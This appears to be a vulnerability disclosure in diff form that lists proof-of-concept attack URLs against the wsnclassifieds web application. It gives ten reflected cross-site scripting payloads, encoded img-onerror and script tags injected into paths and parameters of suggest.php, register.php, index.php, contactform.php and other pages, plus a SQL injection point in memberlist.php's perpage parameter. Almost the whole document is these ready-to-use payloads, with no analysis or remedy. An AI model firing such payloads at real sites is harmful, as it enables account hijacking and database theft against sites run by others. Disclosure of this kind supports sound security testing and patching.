@@ -1,0 +1,26 @@
+Cross-Site Scripting (XSS)
+
+http://www.example.com/wsnclassifieds/suggest.php/58a2e&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;c6cc2cdff91
+ 
+http://www.example.com/wsnclassifieds/sitemap.php/56218&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;d82e0881337
+ 
+http://www.example.com/wsnclassifieds/register.php/66eb5&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;090ab232720
+ 
+http://www.example.com/wsnclassifieds/leaders.php/68c0c&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;026a50f9084
+ 
+http://www.example.com/wsnclassifieds/index.php/d0c15&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;9086e589577
+ 
+http://www.example.com/wsnclassifieds/contactform.php/b3007&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;16aadfe1637
+
+http://www.example.com/wsnclassifieds/index.php?action=userlogin7375e&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;87668222c12&amp;filled=1
+ 
+http://www.example.com/wsnclassifieds/contactform.php?filled=11aefd&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;6db4597a5ab
+ 
+http://www.example.com/wsnclassifieds/suggest.php?action=addcata5886&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;e10802ab7a0&amp;parent=1
+ 
+http://www.example.com/wsnclassifieds/suggest.php?action=addcat&amp;parent=15b2f5&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;9ade5081a20
+
+
+Sql Injection:
+ 
+http://www.example.com/wsnclassifieds/memberlist.php?ascdesc=desc&amp;field=name&amp;perpage=(SQL)
